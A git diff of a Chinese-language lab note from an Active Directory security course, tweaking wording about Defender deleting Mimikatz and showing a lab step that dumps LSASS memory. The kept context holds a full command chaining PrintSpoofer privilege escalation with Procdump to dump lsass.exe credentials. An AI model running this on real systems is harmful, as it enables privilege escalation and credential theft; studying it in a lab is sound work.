@@ -11,7 +11,7 @@ date: 2024-01-31
 Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&t=4257)
 
 ## Background
-有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?
+有了Mimikatz也不一定能夠用，因為Windows的defender也知道，對於攻擊方而言這是個好用的東西，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?
 
 ## Lab
 ### Take LSASS with other ways
@@ -22,8 +22,6 @@ Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGp
 
 #### 方法二
 如果沒有GUI的話，也可以考慮直接使用[Procdump](https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump)，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者
-
-Command: 
 ```bash
 c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt"
 ```
